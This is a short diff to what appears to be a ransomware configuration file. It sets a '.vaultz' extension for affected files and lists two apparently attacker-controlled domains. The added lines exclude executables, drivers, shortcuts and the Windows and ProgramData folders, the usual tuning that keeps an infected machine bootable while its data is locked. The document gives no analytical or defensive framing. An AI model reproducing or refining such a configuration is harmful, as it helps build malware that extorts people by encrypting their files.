@@ -1,4 +1,11 @@
 file_extension: .vaultz
+exclude:
+  - .exe
+  - .dll
+  - .lnk
+  - .sys
+  - %SYSTEMDRIVE%\Windows
+  - %SYSTEMDRIVE%\ProgramData
 domain:
   - checkvisa.xyz
   - novelengine. com
